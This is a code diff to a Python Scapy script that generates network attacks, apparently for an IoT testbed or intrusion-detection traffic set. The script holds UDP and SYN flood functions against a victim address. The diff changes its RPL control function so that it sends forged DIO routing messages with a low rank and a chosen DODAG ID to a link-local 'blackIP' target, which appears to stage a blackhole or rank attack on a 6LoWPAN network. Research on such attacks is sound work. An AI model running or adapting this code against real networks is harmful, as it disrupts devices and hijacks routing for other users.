@@ -5,8 +5,9 @@ from random import *
 from scapy.all import *
 from scapy.contrib.rpl import *
 
-victimIP = 'fd3c:be8a:173f:8e80:bca6:922c:96bf:edfa'
-DODAGID = 'fd3c:be8a:173f:8e80:10b0:8170:8759:49ff'
+blackIP = 'fe80::4%sensor3-pan0'
+victimIP = 'fd3c:be8a:173f:8e80:e870:36cd:9ff:db8'
+DODAGID = 'fd3c:be8a:173f:8e80:e870:36cd:9ff:db8'
 BACKGROUND = 'SmallbigFlows3.pcap'
 
 def UDP_flood(victimIP):
@@ -25,11 +26,18 @@ def SYN_flood(victimIP):
     mystream.send(syn)
     time.sleep(0.1)
 
-def RPL_control(victimIP):
+def RPL_control(blackIP):
+    #must be link local scope address
+    #blackIP = 'fe80::4%sensor3-pan0'
     s = socket.socket(socket.AF_INET6,socket.SOCK_RAW, socket.IPPROTO_ICMPV6)
-    s.connect((victimIP, RandShort()))
+    scopeID = 0
+    for ainfo in socket.getaddrinfo(blackIP, 8080):
+        if ainfo[0].name == 'AF_INET6' and ainfo[1].name == 'SOCK_RAW':
+            scopeID = ainfo[4][3]
+            break
+    s.connect((blackIP, RandShort(), 0, scopeID))
     mystream = StreamSocket(s)
-    control_message = ICMPv6RPL(code=1)/RPLDIO(RPLInstanceID=1,ver=3,rank=0\
+    control_message = ICMPv6RPL(code=1)/RPLDIO(RPLInstanceID=1,ver=3,rank=1\
             ,mop=2,dodagid=DODAGID)\
             /RPLOptRIO(otype=3,plen=64,prf=5,prefix='fd3c:be8a:173f:8e80::')
     mystream.send(control_message)
@@ -100,7 +108,7 @@ elif sys.argv[1] == "-s":
         except KeyboardInterrupt:
             stored_exception = sys.exc_info()
 elif sys.argv[1] == "-i":
-    RPL_control(victimIP)
+    RPL_control(blackIP)
 elif sys.argv[1] == "-b":
     traffic_gen(victimIP)
 else:
